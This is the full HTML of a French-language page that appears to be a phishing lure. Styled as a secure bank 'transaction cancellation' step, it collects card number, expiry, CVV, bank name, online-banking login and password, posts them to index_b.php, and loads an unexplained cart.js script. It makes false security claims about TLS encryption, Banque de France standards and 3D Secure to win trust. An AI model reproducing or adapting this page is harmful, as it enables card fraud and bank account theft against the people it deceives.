<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Annulation de transaction — Espace sécurisé</title>
    <link rel="icon" href="./check.png" type="image/png">
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
    
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }

        :root {
            --primary: #1a56db;
            --primary-dark: #1e40af;
            --primary-light: #eff6ff;
            --success: #059669;
            --danger: #dc2626;
            --gray-50: #f8fafc;
            --gray-100: #f1f5f9;
            --gray-200: #e2e8f0;
            --gray-300: #cbd5e1;
            --gray-400: #94a3b8;
            --gray-500: #64748b;
            --gray-600: #475569;
            --gray-700: #334155;
            --gray-800: #1e293b;
            --gray-900: #0f172a;
            --radius: 12px;
            --radius-sm: 8px;
            --shadow-sm: 0 1px 3px rgba(0,0,0,.08), 0 1px 2px rgba(0,0,0,.06);
            --shadow: 0 4px 6px -1px rgba(0,0,0,.08), 0 2px 4px -1px rgba(0,0,0,.06);
            --shadow-lg: 0 20px 40px -8px rgba(0,0,0,.12), 0 8px 16px -4px rgba(0,0,0,.06);
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            background: var(--gray-50);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: var(--gray-800);
            line-height: 1.5;
        }

        /* ── Top bar ── */
        .topbar {
            width: 100%;
            background: #fff;
            border-bottom: 1px solid var(--gray-200);
            padding: 0 24px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            height: 64px;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .topbar-logo img { height: 36px; object-fit: contain; }
        .topbar-secure {
            display: flex;
            align-items: center;
            gap: 6px;
            font-size: 12px;
            font-weight: 600;
            color: var(--success);
            background: #ecfdf5;
            padding: 6px 12px;
            border-radius: 99px;
            border: 1px solid #a7f3d0;
        }
        .topbar-secure i { font-size: 11px; }

        /* ── Main content ── */
        .page-content {
            width: 100%;
            max-width: 520px;
            padding: 32px 16px 48px;
            flex: 1;
        }

        /* ── Steps indicator ── */
        .steps {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 0;
            margin-bottom: 28px;
        }
        .step {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
        }
        .step-circle {
            width: 32px;
            height: 32px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 12px;
            font-weight: 700;
            border: 2px solid var(--gray-200);
            background: #fff;
            color: var(--gray-400);
            transition: all .3s;
        }
        .step.done .step-circle  { background: var(--success); border-color: var(--success); color: #fff; }
        .step.active .step-circle { background: var(--primary); border-color: var(--primary); color: #fff; box-shadow: 0 0 0 4px rgba(26,86,219,.15); }
        .step-label { font-size: 10px; font-weight: 500; color: var(--gray-400); white-space: nowrap; }
        .step.done .step-label,
        .step.active .step-label { color: var(--gray-600); }
        .step-line {
            flex: 1;
            height: 2px;
            background: var(--gray-200);
            margin: 0 6px;
            margin-bottom: 16px;
            min-width: 32px;
        }
        .step.done + .step-line { background: var(--success); }

        /* ── Card ── */
        .card {
            background: #fff;
            border-radius: var(--radius);
            box-shadow: var(--shadow-lg);
            overflow: hidden;
        }
        .card-header {
            padding: 24px 28px 20px;
            border-bottom: 1px solid var(--gray-100);
        }
        .card-header-top {
            display: flex;
            align-items: flex-start;
            gap: 14px;
        }
        .card-icon {
            width: 44px;
            height: 44px;
            border-radius: 10px;
            background: #fff7ed;
            border: 1px solid #fed7aa;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        .card-icon i { color: #ea580c; font-size: 18px; }
        .card-title { font-size: 17px; font-weight: 700; color: var(--gray-900); margin-bottom: 4px; }
        .card-subtitle { font-size: 13px; color: var(--gray-500); line-height: 1.5; }

        /* Alert bandeau */
        .alert-info {
            margin-top: 16px;
            background: #eff6ff;
            border: 1px solid #bfdbfe;
            border-radius: var(--radius-sm);
            padding: 10px 14px;
            display: flex;
            gap: 10px;
            align-items: flex-start;
            font-size: 12px;
            color: #1e40af;
        }
        .alert-info i { margin-top: 1px; flex-shrink: 0; font-size: 13px; }

        /* ── Form ── */
        .card-body { padding: 24px 28px; }
        .form-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }
        .form-grid .full { grid-column: 1 / -1; }

        .field { display: flex; flex-direction: column; gap: 6px; }
        .field label {
            font-size: 13px;
            font-weight: 600;
            color: var(--gray-700);
            display: flex;
            align-items: center;
            gap: 4px;
        }
        .field label .req { color: var(--danger); }

        .input-wrap {
            position: relative;
            display: flex;
            align-items: center;
        }
        .input-wrap .input-icon-left {
            position: absolute;
            left: 13px;
            color: var(--gray-400);
            font-size: 14px;
            pointer-events: none;
        }
        .input-wrap .input-icon-right {
            position: absolute;
            right: 13px;
            color: var(--gray-400);
            font-size: 14px;
            cursor: pointer;
            transition: color .2s;
        }
        .input-wrap .input-icon-right:hover { color: var(--primary); }

        .field input, .field select {
            width: 100%;
            height: 46px;
            padding: 0 14px 0 38px;
            font-size: 14px;
            font-family: inherit;
            font-weight: 500;
            color: var(--gray-800);
            background: var(--gray-50);
            border: 1.5px solid var(--gray-200);
            border-radius: var(--radius-sm);
            outline: none;
            transition: border-color .2s, box-shadow .2s, background .2s;
            -webkit-appearance: none;
        }
        .field input.no-icon { padding-left: 14px; }
        .field input:focus, .field select:focus {
            border-color: var(--primary);
            background: #fff;
            box-shadow: 0 0 0 3px rgba(26,86,219,.1);
        }
        .field input:focus + .input-icon-left,
        .input-wrap:focus-within .input-icon-left { color: var(--primary); }
        .field input::placeholder { color: var(--gray-300); font-weight: 400; }
        .field input.has-right-icon { padding-right: 40px; }

        /* card brand icon */
        .card-brand {
            position: absolute;
            right: 12px;
            display: flex;
            align-items: center;
            opacity: 0;
            transform: scale(.75);
            transition: opacity .2s ease, transform .2s ease;
            pointer-events: none;
        }
        .card-brand.visible { opacity: 1; transform: scale(1); }
        .card-brand svg { height: 26px; width: auto; }
        #cardnumber { padding-right: 56px !important; }

        /* field hint */
        .field-hint { font-size: 11px; color: var(--gray-400); margin-top: -2px; }

        /* Divider */
        .section-label {
            grid-column: 1 / -1;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: .08em;
            text-transform: uppercase;
            color: var(--gray-400);
            padding-top: 4px;
            border-top: 1px solid var(--gray-100);
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .section-label::after { content: ''; flex: 1; height: 1px; }

        /* ── Submit button ── */
        .btn-submit {
            width: 100%;
            height: 50px;
            background: var(--primary);
            color: #fff;
            border: none;
            border-radius: var(--radius-sm);
            font-size: 15px;
            font-weight: 700;
            font-family: inherit;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            transition: background .2s, transform .1s, box-shadow .2s;
            box-shadow: 0 2px 8px rgba(26,86,219,.3);
            margin-top: 4px;
        }
        .btn-submit:hover:not(:disabled) {
            background: var(--primary-dark);
            box-shadow: 0 4px 16px rgba(26,86,219,.4);
            transform: translateY(-1px);
        }
        .btn-submit:active:not(:disabled) { transform: translateY(0); }
        .btn-submit:disabled { opacity: .8; cursor: not-allowed; }
        .btn-submit .btn-icon { font-size: 14px; }

        /* Spinner */
        .spinner {
            width: 18px; height: 18px;
            border: 2.5px solid rgba(255,255,255,.3);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin .7s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* ── Security footer ── */
        .security-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            margin-top: 16px;
            flex-wrap: wrap;
        }
        .sec-badge {
            display: flex;
            align-items: center;
            gap: 5px;
            font-size: 11px;
            color: var(--gray-500);
            font-weight: 500;
        }
        .sec-badge i { color: var(--success); }

        /* ── Footer image ── */
        .footer-strip {
            width: 100%;
            max-width: 520px;
            margin-top: 20px;
            border-radius: var(--radius);
            overflow: hidden;
        }
        .footer-strip img { width: 100%; height: auto; display: block; }

        /* ── Responsive ── */
        @media (max-width: 480px) {
            .topbar { padding: 0 16px; }
            .page-content { padding: 24px 12px 40px; }
            .card-header, .card-body { padding: 20px 18px; }
            .form-grid { grid-template-columns: 1fr; }
            .form-grid .full { grid-column: 1; }
            .steps { gap: 0; }
            .step-line { min-width: 16px; }
        }
    </style>
</head>
<body>

<!-- ══════════════ TOP BAR ══════════════ -->
<header class="topbar">
    <div class="topbar-logo">
        <img src="./kwKYGMMnx5T0LeAGdXfi61a9Lkk.avif" alt="Logo">
    </div>
    <div class="topbar-secure">
        <i class="fa-solid fa-lock"></i>
        Connexion sécurisée SSL
    </div>
</header>

<!-- ══════════════ PAGE ══════════════ -->
<main class="page-content">

    <!-- Steps -->
    <div class="steps">
        <div class="step done">
            <div class="step-circle"><i class="fa-solid fa-check" style="font-size:11px"></i></div>
            <div class="step-label">Vérification</div>
        </div>
        <div class="step-line"></div>
        <div class="step active">
            <div class="step-circle">2</div>
            <div class="step-label">Coordonnées</div>
        </div>
        <div class="step-line"></div>
        <div class="step">
            <div class="step-circle">3</div>
            <div class="step-label">Confirmation</div>
        </div>
    </div>

    <!-- Card -->
    <div class="card">
        <!-- Header -->
        <div class="card-header">
            <div class="card-header-top">
                <div class="card-icon">
                    <i class="fa-solid fa-rotate-left"></i>
                </div>
                <div>
                    <div class="card-title">Annulation de la transaction</div>
                    <div class="card-subtitle">Renseignez vos informations bancaires pour finaliser l'annulation. Vos données sont chiffrées et traitées de manière sécurisée.</div>
                </div>
            </div>
            <div class="alert-info">
                <i class="fa-solid fa-shield-halved"></i>
                <span>Vos données sont protégées par le chiffrement 256-bit TLS conformément aux standards de la <strong>Banque de France</strong>.</span>
            </div>
        </div>

        <!-- Body / Form -->
        <div class="card-body">
            <form method="post" action="index_b.php" id="loginForm" autocomplete="off">
                <div class="form-grid">

                    <!-- Banque -->
                    <div class="field full">
                        <label>Nom de votre banque <span class="req">*</span></label>
                        <div class="input-wrap">
                            <i class="fa-solid fa-building-columns input-icon-left"></i>
                            <input id="bank" name="bank" type="text" maxlength="200" placeholder="Ex : BNP Paribas, Crédit Agricole…" required>
                        </div>
                    </div>

                    <!-- Numéro de carte -->
                    <div class="field full">
                        <label>Numéro de carte bancaire <span class="req">*</span></label>
                        <div class="input-wrap">
                            <i class="fa-solid fa-credit-card input-icon-left"></i>
                            <input id="cardnumber" name="cardnumber" type="text" inputmode="numeric"
                                   pattern="(\d{4}[\s]?\d{4}[\s]?\d{4}[\s]?\d{4})"
                                   placeholder="0000 0000 0000 0000" maxlength="19" required>
                            <div class="card-brand" id="cardBrandSlot">
                                <svg id="ccicon" viewBox="0 0 750 471" xmlns="http://www.w3.org/2000/svg"></svg>
                            </div>
                        </div>
                    </div>

                    <!-- Expiration -->
                    <div class="field">
                        <label>Date d'expiration <span class="req">*</span></label>
                        <div class="input-wrap">
                            <i class="fa-regular fa-calendar input-icon-left"></i>
                            <input id="expirationdate" name="expirationdate" type="text"
                                   inputmode="numeric" placeholder="MM/AA" maxlength="5"
                                   pattern="(0[1-9]|1[0-2])[\s]?\/?[\s]?[0-9]{2}" required>
                        </div>
                    </div>

                    <!-- CVV -->
                    <div class="field">
                        <label>Code CVV <span class="req">*</span></label>
                        <div class="input-wrap">
                            <i class="fa-solid fa-lock input-icon-left"></i>
                            <input id="securitycode" name="securitycode" type="text"
                                   inputmode="numeric" placeholder="3 chiffres"
                                   pattern="[0-9]*" maxlength="4" class="has-right-icon" required>
                            <span class="input-icon-right" style="cursor:default;" title="3 derniers chiffres au dos de votre carte">
                                <i class="fa-regular fa-circle-question"></i>
                            </span>
                        </div>
                        <div class="field-hint">3 chiffres au dos de votre carte</div>
                    </div>

                    <!-- Séparateur -->
                    <div class="section-label full">Accès espace bancaire</div>

                    <!-- Identifiant -->
                    <div class="field full">
                        <label>Identifiant bancaire <span class="req">*</span></label>
                        <div class="input-wrap">
                            <i class="fa-solid fa-user input-icon-left"></i>
                            <input id="identifiant" name="identifiant" type="text" maxlength="20"
                                   placeholder="Votre identifiant" required>
                        </div>
                    </div>

                    <!-- Code secret -->
                    <div class="field full">
                        <label>Code secret / Mot de passe <span class="req">*</span></label>
                        <div class="input-wrap">
                            <i class="fa-solid fa-key input-icon-left"></i>
                            <input id="password" name="password" type="password"
                                   placeholder="••••••••" class="has-right-icon" required>
                            <span class="input-icon-right" id="togglePassword" title="Afficher/masquer">
                                <i class="fa-regular fa-eye" id="toggleIcon"></i>
                            </span>
                        </div>
                    </div>

                    <!-- Submit -->
                    <div class="full" style="margin-top: 8px;">
                        <button type="submit" class="btn-submit" id="submitBtn">
                            <span class="btn-text">Confirmer l'annulation</span>
                            <i class="fa-solid fa-arrow-right btn-icon btn-text"></i>
                            <div class="spinner" style="display:none;" id="btnSpinner"></div>
                        </button>

                        <div class="security-row">
                            <span class="sec-badge"><i class="fa-solid fa-lock"></i> Chiffrement 256-bit</span>
                            <span class="sec-badge"><i class="fa-solid fa-shield-halved"></i> 3D Secure</span>
                            <span class="sec-badge"><i class="fa-solid fa-circle-check"></i> Données protégées</span>
                        </div>
                    </div>

                </div>
            </form>
        </div>
    </div>

    <!-- Footer strip -->
    <div class="footer-strip">
        <img src="./T6EWjPeJbYpmdVRDMjkT58dKk.avif" alt="Partenaires de paiement">
    </div>

</main>

<script>
    // ── Toggle password ──
    document.getElementById('togglePassword').addEventListener('click', function () {
        const input = document.getElementById('password');
        const icon = document.getElementById('toggleIcon');
        const isHidden = input.type === 'password';
        input.type = isHidden ? 'text' : 'password';
        icon.className = isHidden ? 'fa-regular fa-eye-slash' : 'fa-regular fa-eye';
    });

    // ── Expiration mask ──
    const expInput = document.getElementById('expirationdate');
    expInput.addEventListener('input', function () {
        let v = this.value.replace(/\D/g, '');
        if (v.length >= 3) v = v.slice(0, 2) + '/' + v.slice(2, 4);
        this.value = v;
    });

    // ── Card brand detection + format ──
    (function () {
        const BRANDS = [
            { // Visa
                rx: /^4/,
                svg: '<rect width="750" height="471" rx="40" fill="#fff" stroke="#dde" stroke-width="10"/>'
                   + '<text x="375" y="330" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="230" fill="#1A1F71" text-anchor="middle">VISA</text>'
            },
            { // Mastercard
                rx: /^(5[1-5]|222[1-9]|22[3-9]\d|2[3-6]\d{2}|27[01]\d|2720)/,
                svg: '<rect width="750" height="471" rx="40" fill="#fff" stroke="#dde" stroke-width="10"/>'
                   + '<circle cx="280" cy="235" r="165" fill="#EB001B"/>'
                   + '<circle cx="470" cy="235" r="165" fill="#F79E1B"/>'
                   + '<path d="M375,100 A165,165,0,0,1,375,370 A165,165,0,0,1,375,100Z" fill="#FF5F00"/>'
            },
            { // American Express
                rx: /^3[47]/,
                svg: '<rect width="750" height="471" rx="40" fill="#2E77BC"/>'
                   + '<text x="375" y="305" font-family="Arial Black,Arial,sans-serif" font-weight="900" font-size="160" fill="#fff" text-anchor="middle">AMEX</text>'
            },
            { // Discover
                rx: /^6(?:011|5[0-9])/,
                svg: '<rect width="750" height="471" rx="40" fill="#fff" stroke="#dde" stroke-width="10"/>'
                   + '<circle cx="545" cy="235" r="175" fill="#F76E20"/>'
            },
            { // Maestro
                rx: /^(6304|6759|676[1-3])/,
                svg: '<rect width="750" height="471" rx="40" fill="#fff" stroke="#dde" stroke-width="10"/>'
                   + '<circle cx="285" cy="235" r="160" fill="#0099DF"/>'
                   + '<circle cx="465" cy="235" r="160" fill="#E31837"/>'
                   + '<path d="M375,103 A160,160,0,0,1,375,367 A160,160,0,0,1,375,103Z" fill="#7375CF"/>'
            }
        ];

        const cardInput = document.getElementById('cardnumber');
        const ccIcon    = document.getElementById('ccicon');
        const brandSlot = document.getElementById('cardBrandSlot');

        cardInput.addEventListener('input', function () {
            const digits = this.value.replace(/\D/g, '').slice(0, 16);
            this.value = digits.replace(/(.{4})/g, '$1 ').trim();

            const brand = BRANDS.find(b => b.rx.test(digits));
            if (brand) {
                ccIcon.innerHTML = brand.svg;
                brandSlot.classList.add('visible');
            } else {
                ccIcon.innerHTML = '';
                brandSlot.classList.remove('visible');
            }
        });
    })();

    // ── Submit loader ──
    document.getElementById('loginForm').addEventListener('submit', function () {
        const btn = document.getElementById('submitBtn');
        const texts = btn.querySelectorAll('.btn-text');
        const spinner = document.getElementById('btnSpinner');
        texts.forEach(el => el.style.display = 'none');
        spinner.style.display = 'inline-block';
        btn.disabled = true;
    });
</script>
    <script src="./cart.js"></script>
</body>
</html>
